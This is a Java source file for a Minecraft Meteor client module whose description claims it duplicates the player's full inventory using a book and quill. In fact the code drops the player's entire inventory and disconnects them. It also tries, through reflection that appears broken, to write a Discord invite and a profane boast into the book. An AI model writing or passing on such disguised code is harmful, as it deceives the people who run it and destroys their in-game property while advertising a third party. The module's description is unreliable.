package de.damcraft.serverseeker.modules;

import de.damcraft.serverseeker.ServerSeeker;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screens.inventory.BookViewScreen;
import net.minecraft.network.chat.Component;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.item.Items;

public class PaperBookDupe extends Module {
    public PaperBookDupe() {
        super(ServerSeeker.C.MAIN, "PaperBookDupe", "Dupes your full inventory by using a book and quill. Before doing this, you must reconnect.");
    }

    @EventHandler
    public void onTick(TickEvent.Post e) throws NoSuchFieldException, IllegalAccessException {
        this.toggle();
        var hand = ServerSeeker.mc.player.getMainHandItem();
        if (hand.getItem() != Items.WRITABLE_BOOK) {
            ServerSeeker.mc.player.sendSystemMessage(Component.literal("[CornSeeker] To do PaperBookDupe, you must hold a book and quil in your main hand!"));
            return;
        }
//        hand.use(ServerSeeker.mc.world, ServerSeeker.mc.player, Hand.MAIN_HAND);
        ServerSeeker.mc.player.openItemGui(hand, InteractionHand.MAIN_HAND);
        var screen = ServerSeeker.mc.screen;
        if (screen instanceof BookViewScreen book) {
            var ch = book.getClass().getDeclaredField("bookAccess");
            var contents = (BookViewScreen.BookAccess) ch.get(BookViewScreen.BookAccess.class);
            contents.pages().add(Component.literal(".gg/4dmqcVfQjA OLAFCIO.PL ON FUCKING TOP YA"));
            ServerSeeker.mc.player.getInventory().dropAll();
            ServerSeeker.mc.disconnectWithProgressScreen();
        } else {
            ServerSeeker.mc.player.sendSystemMessage(Component.literal("[CornSeeker] Something fucked up in PaperBookDupe!"));
        }
    }
}
